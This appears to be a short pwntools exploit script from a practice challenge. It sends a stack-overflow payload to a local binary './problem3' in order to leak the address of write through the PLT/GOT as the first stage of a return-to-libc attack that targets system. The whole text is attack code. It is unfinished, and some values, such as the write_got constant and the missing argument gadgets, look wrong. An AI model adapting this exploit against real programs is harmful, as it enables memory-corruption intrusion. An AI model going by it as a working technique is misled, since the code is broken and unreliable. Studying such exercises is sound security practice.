#-*- coing : utf-8 -*-
from pwn import *

write_plt = 0x0000000000400430
write_got = 0x006800200be225ff
addr_write = 0x7ffff7b003b0
addr_system = 0x7ffff7a57590


p = process(["./problem3"])

payload = "a"*0x80
payload += p64(0)
payload += p64(write_plt)
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)

p.sendline(payload)
#pause()

print p.recvline()
#leak_write = u32(p.recv(4))




